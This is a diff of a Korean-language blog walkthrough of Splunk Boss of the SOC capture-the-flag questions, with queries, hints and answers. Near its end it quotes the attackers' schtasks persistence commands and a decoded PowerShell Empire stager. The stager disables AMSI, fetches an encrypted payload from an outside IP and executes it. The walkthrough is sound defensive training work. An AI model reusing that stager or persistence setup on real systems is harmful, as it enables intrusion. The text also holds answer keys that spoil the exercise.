-&lt;p&gt;시작 : LyoKICogVWJ1bnR1IDE2
-끝 : JldHVybiAwOwp9 &amp;gt;&amp;amp;gt&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-22-06-41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;답 :  * Ubuntu 16.04.4 kernel priv esc&lt;/p&gt;
-
-&lt;p&gt;329	One of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?
-대동강이 업로드한 파일 중 하나에는 파일의 다른 어떤 것보다 훨씬 큰 글자 크기의 단어가 포함되어 있습니다. 그 단어는 무엇입니까?&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Figure out what files were uploaded, and pivot off of interesting file names found. The WinEventLog:Security sourcetype is helpful, as is the osquery:results sourcetype.&lt;br /&gt;
-    어떤 파일이 업로드되었는지 파악하고 발견된 흥미로운 파일 이름을 중심으로 중심을 잡습니다. WinEventLog:Security 소스 유형은 osquery:results 소스 유형과 마찬가지로 유용합니다.
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    You are looking for a long string of base64 information.&lt;br /&gt;
-    긴 base64 정보 문자열을 찾고 있습니다.
+    Open notable events for more details.&lt;br /&gt;
+    자세한 내용은 주목할만한 이벤트를 엽니다.
 &lt;/details&gt;
 &lt;details&gt;
   &lt;summary&gt;hint#3&lt;/summary&gt;
-    You will need to find a site to decode the base64 to a viewable image. CyberChef is a good one!
-    base64를 볼 수 있는 이미지로 디코딩하려면 사이트를 찾아야 합니다. CyberChef는 좋은 사람입니다!
+    Look for two notable events with the exact same title that has a filename in it.&lt;br /&gt;
+    파일 이름이 있는 정확히 동일한 제목을 가진 두 개의 주목할만한 이벤트를 찾으십시오.
 &lt;/details&gt;
 
-&lt;p&gt;지금까지 문제에서 대동강그룹이 업로드한 파일은 colonel, Frothly_GABF_Deck-2018-MK.pptx, 1534778082419.png, definitelydontinvestigatethisfile.sh로 파악했습니다.
-각 검색하여 base64 디코딩해봅시다.
-&lt;strong&gt;definitelydontinvestigatethisfile.sh&lt;/strong&gt;를 검색해보면
-sysmon에 아래 base64 코드들이 있습니다.
-시작 : /9j/4AAQSkZJRgABAQAAAQABAAD/
-끝 : BvdGF0byBwaG9uZQo=&lt;/p&gt;
+&lt;p&gt;Incident Review dashboard가 없으므로 해당문제는 풀이하지 않도록하겠습니다&lt;/p&gt;
 
-&lt;p&gt;해당 데이터를 디코드해보면 아래와 같습니다. 
-&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-22-21-07.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;답 : 160.153.91.7&lt;/p&gt;
 
-&lt;p&gt;답 : splunk&lt;/p&gt;
+&lt;p&gt;403	Based on the IP address found in question 402, what domain of interest is associated with that IP address?&lt;br /&gt;
+문제 402에서 찾은 IP 주소를 기반으로 해당 IP 주소와 연결된 관심 도메인은 무엇입니까?&lt;/p&gt;
 
-&lt;p&gt;330	What Frothly VPN user generated the most traffic? Answer guidance: Provide the VPN user name.&lt;br /&gt;
-어떤 Frothly VPN 사용자가 가장 많은 트래픽을 생성했습니까? 답변 안내: VPN 사용자 이름을 제공합니다.&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;hint#1&lt;/summary&gt;
-    Start with cisco:asa as the sourcetype.
-    sourcetype cisco:asa에서 조사하십시오.
+    Investigations might shed some light on this.&lt;br /&gt;
+    Investigations이 실마리입니다.
 &lt;/details&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=cisco:asa eventtype=cisco_vpn
-| stats count by Cisco_ASA_user
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    Did you know Enterprise Security has the ability to collect notes and screenshots from other analysts including threat intelligence?&lt;br /&gt;
+    Enterprise Security가 위협 인텔리전스를 비롯한 다른 분석가로부터 메모와 스크린샷을 수집할 수 있다는 사실을 알고 계셨습니까?
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    Find the investigation with the attachment to gain some additional intelligence about the threat.&lt;br /&gt;
+    첨부 파일이 있는 조사를 찾아 위협에 대한 추가 정보를 얻으십시오.
+&lt;/details&gt;
+
+&lt;p&gt;402의 답은 &lt;strong&gt;160.153.91.7&lt;/strong&gt;입니다.&lt;/p&gt;
+
+&lt;p&gt;도메인은 stream:dns에 있을것입니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:dns 160.153.91.7
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;name 필드의 값을 보면 2가지 값이 나옵니다.
+&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-27-22-01-37.png&quot; alt=&quot;dns name&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;해당 도메인에 대한 정보를 &lt;a href=&quot;https://www.threatcrowd.org/domain.php?domain=hildegardsfarm.com&quot;&gt;threatcrowd.org&lt;/a&gt;에서 검색해봅니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-27-22-03-23.png&quot; alt=&quot;OSINT&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;DNS RESOLUTIONS 항목을 보면 우리가 찾았던 IP인 160.153.91.7와 관계있다는 사실을 발견할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;답 : hildegardsfarm.com&lt;/p&gt;
+
+&lt;p&gt;404	What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?&lt;br /&gt;
+winsys32.dll이 Frothly 환경으로 다운로드하게 만드는 비정상적인 파일은 무엇입니까?&lt;/p&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    The question is asking about the use of a file called winsys32.dll. Look around for this file and pivot off its utilization!&lt;br /&gt;
+    질문은 winsys32.dll이라는 파일의 사용에 대해 묻고 있습니다. 이 파일을 찾아 활용을 피벗 하십시오!
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    Find how and when the file winsys32.dll is used being used by Taedonggang. You will need to first find winsys32.dll and then pivot to a new sourcetype. Correlate by time and protocol.&lt;br /&gt;
+    파일 winsys32.dll이 대동강에서 사용되는 방법과 시기를 찾으십시오. 먼저 winsys32.dll을 찾은 다음 새 소스 유형으로 피벗해야 합니다. 시간과 프로토콜을 연관시킵니다.
+&lt;/details&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    If you have found the new sourcetype and one of the correct spans of time (there are more than one), look at the filename field. The answer should stare out at you.&lt;br /&gt;
+    새 소스 유형과 올바른 시간 범위 중 하나(둘 이상 있음)를 찾은 경우 파일 이름 필드를 확인합니다. 대답은 당신을 응시해야합니다.
+&lt;/details&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;winsys32.dll
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-27-22-14-00.png&quot; alt=&quot;winsys32.dll결과&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;ftp로 파일을 옮긴것을 확인했습니다. (이벤트발생시간 17/08/24 4:16:40.000) stream:ftp에서 마저 확인해봅시다.
+ftp 로그중, 다운로드받는 이벤트를 확인해보면 될것입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-27-22-17-07.png&quot; alt=&quot;ftp method&quot; /&gt;
+ftp method중 다운로드받는 method는 &lt;strong&gt;RETR&lt;/strong&gt; 입니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;stream:ftp method=RETR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;결과 중 filename의 필드의 값을 보면 &lt;strong&gt;나는_데이비드를_사랑한다.hwp (이벤트가 발생한 시간은 17/08/24 4:00:16.831)&lt;/strong&gt;라는 특이한 이름의 파일이 있습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-10-27-22-19-19.png&quot; alt=&quot;ftp filename&quot; /&gt;
+이벤트 발생 시간을 비교해보아 해당 파일이 비정상적인 파일임을 알 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;답 : 나는_데이비드를_사랑한다.hwp&lt;/p&gt;
+
+&lt;p&gt;405	What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim’s workstation? Answer example: John Smith&lt;br /&gt;
+첫 번째 희생자 단말에서 PowerShell Empire를 실행한 파일의 메타데이터에 연루된 희생자의 이름과 성은 무엇입니까? 답변 예: John Smith&lt;/p&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    This is an open source intelligence question. You will need to find the file name/hash of the file that first infected Frothly (think of the extracted file from the answer to question 400) and then pivot off to the internet.&lt;br /&gt;
+    이 문제는 오픈 소스 인텔리전스 질문입니다. Frothly를 처음 감염시킨 파일의 파일 이름/해시를 찾은 다음(문제 400에 대한 답변에서 추출된 파일을 생각하십시오) 인터넷으로 전환해야 합니다.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    If you have found the file that first infected Frothly with PowerShell Empire take a look at the Incident Review dashboard. You should find the hash and pivot off that hash in open source intelligence sources. Look at the chart in https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint.html for a commonly-used sandbox site that takes file hashes.&lt;br /&gt;
+    Frothly를 PowerShell Empire로 처음 감염시킨 파일을 찾았다면 Incident Review 대시보드를 살펴보십시오. 오픈 소스 인텔리전스 소스에서 해시를 찾고 해당 해시를 피벗해야 합니다. 파일 해시를 사용하는 일반적으로 사용되는 샌드박스 사이트는 https://www.splunk.com/blog/2017/07/21/work-flow-ing-your-osint.html의 차트를 참조하십시오.    
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    Find the answer to question 400. Look in the logs to find the name of document file extracted from the zipped attachment. Search for that filename in the Incident Review 'Search' filter. Take the hash mentioned in the 'comments' field and search Virustotal for that hash.&lt;br /&gt;
+    400번 문제에 대한 답을 찾으십시오. 로그에서 압축된 첨부 파일에서 추출한 문서 파일의 이름을 찾으십시오. 사건 검토 '검색' 필터에서 해당 파일 이름을 검색합니다. '설명' 필드에 언급된 해시를 가져와서 Virustotal에서 해당 해시를 검색합니다.    
+&lt;/details&gt;
+
+&lt;p&gt;추후 풀이 예정&lt;/p&gt;
+
+&lt;p&gt;406	What is the average Shannon entropy score of the subdomain containing UDP-exfiltrated data? Answer guidance: Cut off, not rounded, to the first decimal place. Answer examples: 3.2 or 223234.9&lt;br /&gt;
+UDP 추출 데이터가 포함된 하위 도메인의 평균 Shannon 엔트로피 점수는 얼마입니까? 답변 안내: 반올림하지 않고 소수점 첫째 자리까지 자릅니다. 답변 예: 3.2 또는 223234.9&lt;/p&gt;
+
+&lt;details&gt;
+  &lt;summary&gt;hint#1&lt;/summary&gt;
+    First you will need to find the domain associated with the exfiltrated data. Look at the Stream metadata for a UDP protocol often used to exfiltrate data.&lt;br /&gt;
+    먼저 추출된 데이터와 연결된 도메인을 찾아야 합니다. 데이터를 추출하는 데 자주 사용되는 UDP 프로토콜에 대한 스트림 메타데이터를 살펴보세요.
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#2&lt;/summary&gt;
+    Review the stream:dns sourcetype and find the IP address that has a high number of queries but is not a normal/legitimate target for DNS queries (IE not RFC1918 or Open DNS server). Look at the domain in the queries to that IP address. Pivot off of that to calculate shannon entropy.&lt;br /&gt;
+    stream:dns sourcetype을 검토하고 쿼리 수가 많지만 DNS 쿼리에 대한 정상/적법한 대상이 아닌 IP 주소를 찾으십시오(IE가 RFC1918 또는 Open DNS 서버가 아님). 해당 IP 주소에 대한 쿼리에서 도메인을 확인합니다. 섀넌 엔트로피를 계산하기 위해 피벗하십시오.    
+&lt;/details&gt;
+&lt;details&gt;
+  &lt;summary&gt;hint#3&lt;/summary&gt;
+    If you have never calculated Shannon Entropy, look at the documents for the tool 'URL TOOLBOX' or recent entries in https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics.html. This will teach you how to calculate Shannon entropy. Also review https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf where you can learn how to detect DNS exfiltration&lt;br /&gt;
+    Shannon Entropy를 계산한 적이 없다면 https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics에서 도구 'URL TOOLBOX' 또는 최근 항목에 대한 문서를 살펴보십시오. .html. 이것은 섀넌 엔트로피를 계산하는 방법을 알려줄 것입니다. DNS 유출을 감지하는 방법을 배울 수 있는 https://www.splunk.com/pdfs/events/govsummit/hunting_the_known_unknowns_with_DNS.pdf 검토하십시오.
+&lt;/details&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:dns dest_port=53 
+| stats count by dest_ip 
 | sort -count
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th&gt;Cisco_ASA_user&lt;/th&gt;
+      &lt;th&gt;dest_ip&lt;/th&gt;
       &lt;th&gt;count&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
     &lt;tr&gt;
-      &lt;td&gt;mkraeusen&lt;/td&gt;
-      &lt;td&gt;38&lt;/td&gt;
+      &lt;td&gt;8.8.8.8&lt;/td&gt;
+      &lt;td&gt;81603&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;bstoll&lt;/td&gt;
-      &lt;td&gt;36&lt;/td&gt;
+      &lt;td&gt;10.0.1.100&lt;/td&gt;
+      &lt;td&gt;44676&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;bgist&lt;/td&gt;
-      &lt;td&gt;19&lt;/td&gt;
+      &lt;td&gt;172.31.0.2&lt;/td&gt;
+      &lt;td&gt;34004&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;fyodor&lt;/td&gt;
+      &lt;td&gt;4.4.4.4&lt;/td&gt;
+      &lt;td&gt;7479&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;208.109.255.42&lt;/td&gt;
+      &lt;td&gt;444&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;216.69.185.42&lt;/td&gt;
+      &lt;td&gt;406&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;192.52.178.30&lt;/td&gt;
+      &lt;td&gt;30&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;192.175.48.42&lt;/td&gt;
+      &lt;td&gt;26&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;192.48.79.30&lt;/td&gt;
       &lt;td&gt;14&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;pcerf&lt;/td&gt;
-      &lt;td&gt;13&lt;/td&gt;
+      &lt;td&gt;193.221.113.53&lt;/td&gt;
+      &lt;td&gt;10&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;ghoppy&lt;/td&gt;
-      &lt;td&gt;5&lt;/td&gt;
+      &lt;td&gt;216.239.34.10&lt;/td&gt;
+      &lt;td&gt;10&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;btun&lt;/td&gt;
-      &lt;td&gt;3&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;abungstein&lt;/td&gt;
-      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;157.55.133.11&lt;/td&gt;
+      &lt;td&gt;8&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;답 : mkraeusen&lt;/p&gt;
+&lt;p&gt;외부망에서 요청한 건은 아래와 같습니다.
+208.109.255.42
+216.69.185.42&lt;/p&gt;
 
-&lt;p&gt;331	Using Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier. Answer guidance: UF = Q3 + 1.5 x IQR&lt;br /&gt;
-Splunk 명령만 사용하는 경우 하루 종일 Windows 호스트의 이벤트 코드 4688 수에 대한 사분위수 범위(IQR)의 상한(UF) 값은 얼마입니까? 1.5 배율을 사용하십시오. 답변 안내: UF = Q3 + 1.5 x IQR&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Start with WinEventLog:Security as the sourcetype.&lt;br /&gt;
-    sourcetype WinEventLog:Security를 조사하십시오.
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    Splunk commands such as eventstats, perc25() and perc75() would be helpful here.&lt;br /&gt;
-    여기에서 eventstats, perc25() 및 perc75()와 같은 Splunk 명령이 도움이 될 것입니다.
-&lt;/details&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#3&lt;/summary&gt;
-    If you have never used the interquartile range (IQR) to identify outliers, take a look at the documentation https://docs.splunk.com/Documentation/Splunk/latest/Search/Findingandremovingoutliers#Use_the_interquartile_range_.28IQR.29_to_identify_outliers&lt;br /&gt;
-    사분위수 범위(IQR)를 사용하여 이상값을 식별한 적이 없는 경우 https://docs.splunk.com/Documentation/Splunk/latest/Search/Findingandremovingoutliers#Use_the_interquartile_range_.28IQR.29_to_identify_outliers 문서를 참조하십시오.
-&lt;/details&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4688&quot;&gt;eventcode4688&lt;/a&gt;
-새 process creation 이벤트 코드입니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=wineventlog EventCode=4688
-| eventstats perc25(count) as p25, perc75(count) as p75
-| eval IQR=p75-p25
-| eval UF=p75+1.5*IQR
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;index=botsv2 sourcetype=stream:dns (dest_ip=216.69.185.42 OR dest_ip=208.109.255.42) query=* 
+| rex field=query &quot;(?&amp;lt;subdomain&amp;gt;\w+).hildegardsfarm.com&quot;
+| `ut_shannon(subdomain)`
+| stats avg(ut_shannon) by dest_ip
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;답 : 1368&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;dest_ip&lt;/th&gt;
+      &lt;th&gt;avg(ut_shannon)&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;208.109.255.42&lt;/td&gt;
+      &lt;td&gt;3.616738283047444&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;216.69.185.42&lt;/td&gt;
+      &lt;td&gt;3.633958469641545&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
 
-&lt;p&gt;332	What is the CVE of the vulnerability that escalated permissions on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)
-Linux 호스트 hoth에서 권한을 에스컬레이션한 취약점의 CVE는 무엇입니까? 답변 안내: 일반 CVE 형식으로 제출하십시오. (예: cve-2018-9805)&lt;/p&gt;
+&lt;p&gt;각 값을 두번째자리에서 반올림하면 3.6입니다.&lt;/p&gt;
+
+&lt;p&gt;답 : 3.6&lt;/p&gt;
+
+&lt;p&gt;407	To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html&lt;br /&gt;
+Frothly 네트워크의 지속성을 유지하기 위해 Daedonggang APT는 C2 서버에 다시 신호를 보내도록 여러 예약된 작업을 구성했습니다. 이러한 예약된 작업에서 가장 많이 연락하는 단일 웹 페이지는 무엇입니까? 답변 안내: 경로를 제거하고 확장자가 있는 단일 값을 입력합니다. 답변 예: index.php 또는 images.html&lt;/p&gt;
+
 &lt;details&gt;
   &lt;summary&gt;hint#1&lt;/summary&gt;
-    Start with any sourcetype that provides detailed process execution data, or one that provides clear-text details of information posted to the Linux host hoth.&lt;br /&gt;
-    자세한 프로세스 실행 데이터를 제공하는 소스 유형이나 Linux 호스트 hoth에 게시된 정보의 일반 텍스트 세부 정보를 제공하는 소스 유형으로 시작하십시오.
+    Review the question for keywords and search against the hosts in the network.&lt;br /&gt;
+    키워드에 대한 질문을 검토하고 네트워크의 호스트에 대해 검색하십시오.
 &lt;/details&gt;
+
 &lt;details&gt;
   &lt;summary&gt;hint#2&lt;/summary&gt;
-    You are looking for a long string of base64 information.
-    긴 base64 정보 문자열을 찾고 있습니다.
+    Look in the sysmon logs for workstations: XmlWinEventLog:Microsoft-Windows-Sysmon/Operational if you haven't figured out where to start!&lt;br /&gt;
+    어디서부터 시작해야 할지 모르겠다면 워크스테이션용 sysmon 로그를 살펴보세요. XmlWinEventLog:Microsoft-Windows-Sysmon/Operational!
 &lt;/details&gt;
+
 &lt;details&gt;
   &lt;summary&gt;hint#3&lt;/summary&gt;
-    Google search.
-    구글링 하세요.
+    Once you find the event for scheduled tasks, you will need to pivot to the sourcetype=WinRegistry. In that sourcetype, look for where the scheduled task receives its destination information. You will need to decode it!&lt;br /&gt;
+    예약된 작업에 대한 이벤트를 찾으면 sourcetype=WinRegistry로 피벗해야 합니다. 해당 소스 유형에서 예약된 작업이 대상 정보를 수신하는 위치를 찾습니다. 디코딩해야 합니다!
 &lt;/details&gt;
 
-&lt;p&gt;328번문제에서 발견한 “* Ubuntu 16.04.4 kernel priv esc”를 구글링해봅시다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/schtasks&quot;&gt;schtasks.exe&lt;/a&gt;는 예약작업을 수행하는 작업스케줄러 명령어입니다. 해당 프로그램을 키워드로 sysmon에서 검색해봅시다.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/44298&quot;&gt;CVE-2017-16995&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; schtasks.exe CommandLine=*
+| table  _time host CommandLine
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;답 : CVE-2017-16995&lt;/p&gt;
+&lt;p&gt;결과 중 network debug관련 이벤트가 보입니다. 예약작업관련 데이터는 winregistry&lt;/p&gt;
 
-&lt;p&gt;333	What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth? Answer guidance: Submit in normal CVE format. (Example: cve-2018-9805)&lt;br /&gt;
-Linux 호스트 hoth에서 명령을 실행하기 위해 악용된 취약점의 CVE는 무엇입니까? 답변 안내: 일반 CVE 형식으로 제출하십시오. (예: cve-2018-9805)&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;_time&lt;/th&gt;
+      &lt;th&gt;host&lt;/th&gt;
+      &lt;th&gt;CommandLine&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/08/24 03:45:03&lt;/td&gt;
+      &lt;td&gt;wrk-btun&lt;/td&gt;
+      &lt;td&gt;“C:\Windows\system32\schtasks.exe”  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c &quot;IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))&quot;”&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/08/24 04:04:26&lt;/td&gt;
+      &lt;td&gt;wrk-klagerf&lt;/td&gt;
+      &lt;td&gt;“C:\Windows\system32\schtasks.exe”  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c &quot;IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))&quot;”&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/08/24 04:12:36&lt;/td&gt;
+      &lt;td&gt;venus&lt;/td&gt;
+      &lt;td&gt;“C:\Windows\system32\schtasks.exe”  /Create /F /RU system /SC DAILY /ST 10:51 /TN Updater /TR “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c &quot;IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))&quot;”&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=WinRegistry \\Software\\Microsoft\\Network
+| stats count by data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;결과가 총 네개 나옵니다. data필드를 base64로 decode하면&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLD('amsiInitFailed','NonPublic,Static').SETVAlUe($nUll,$tRue)};[System.NET.SeRviCEPoIntMANAGEr]::EXPect100ConTiNue=0;$Wc=New-ObJECT SYSTeM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADeRS.ADd('User-Agent',$u);$wc.PRoxY=[SYStem.NET.WEBRequESt]::DEFaUlTWeBPrOxY;$Wc.PrOXy.CRedEntialS = [SYsTEM.NET.CRedeNtiALCachE]::DeFAuLTNEtWorkCreDeNtials;$K=[SYsTem.TeXT.EncODIng]::ASCII.GETBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxOR$S[($S[$I]+$S[$H])%256]}};$wc.HeaDERs.AdD(&quot;Cookie&quot;,&quot;session=wInU2UbWvd/SdOjjVta0BHaZHjI=&quot;);$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr+$T);$iv=$DaTA[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](&amp;amp; $R $dATA ($IV+$K))|IEX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;이런식으로 나옵니다. 나머지 세개도 base64로 decode해보면&lt;/p&gt;
+
+&lt;p&gt;/news.php - 1개&lt;br /&gt;
+/admin/get.php - 1개&lt;br /&gt;
+/login/process.php - 2개&lt;br /&gt;
+가 나옵니다.&lt;/p&gt;
+
+&lt;p&gt;그러므로, process.php를 가장 자주 요청합니다.&lt;/p&gt;
+
+&lt;p&gt;답 : process.php&lt;/p&gt;
+
